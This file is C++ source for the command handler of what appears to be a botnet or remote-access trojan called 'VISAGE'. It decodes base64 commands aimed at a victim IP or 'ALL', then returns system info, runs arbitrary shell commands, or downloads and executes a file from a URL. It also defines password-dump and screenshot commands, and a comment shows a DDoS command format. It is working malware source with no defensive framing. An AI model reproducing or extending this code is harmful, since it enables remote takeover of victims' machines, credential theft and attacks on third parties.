#include "common.h"

#define VISAGE_COMMAND_INFO "SYSINFO"
#define VISAGE_COMMAND_EXEC "EXECUTE["
#define VISAGE_COMMAND_PASSDUMP "PASSDUMP"
#define VISAGE_COMMAND_SCREENSHOT "SCREENSHOT"
#define VISAGE_COMMAND_DNEXEC	"DNEXEC["
#define VISAGE_COMMAND_ARG_SEP  ":="
//command format: [TO] TYPE[ARGS IF REQUIRED]
//ex: 2.2.2.2 SYSINFO //no args for sysinfo
//ex: ALL DDOS[www.example.com:20] //all ddos www.example.com for 20 cylces

bool IsCommand(const char* data,const char*type)
{
	if (strstr(data,type) != 0)
		return true;
	return false;
}

std::string TeleHandleCommand(std::string data,std::string ip) //command should be in base64 format for simplicity
{
	std::string decoded = base64_decode(data);
	const char*isMe = strstr(decoded.c_str(),ip.c_str());
	if (isMe != 0 || (strstr(decoded.c_str(),"ALL") != 0)) //command for me :)
	{
		if (IsCommand(decoded.c_str(),VISAGE_COMMAND_INFO))
		{
			//get sys info
			return GetSysInfo();
		}
		if (IsCommand(decoded.c_str(),VISAGE_COMMAND_EXEC))
		{
			//oh, look... A retard wants to execute "del C:\windows\system32".... meh
			std::string actCmd = TeleParseArgs(decoded);
			if (actCmd.size() > 0)
				return ExecCmd(actCmd);
			else
				return std::string("Command Error");
		}
		if (IsCommand(decoded.c_str(),VISAGE_COMMAND_DNEXEC))
		{
			std::string url = TeleParseArg1(decoded);
			std::string path = TeleParseArg2(decoded);
			if (url.size() > 0 && path.size() > 0)
				return DownloadExec(url,path);
			else
				return std::string("Download-n-exec error... boi");
		}
	}
	return std::string("Unknown Command");
}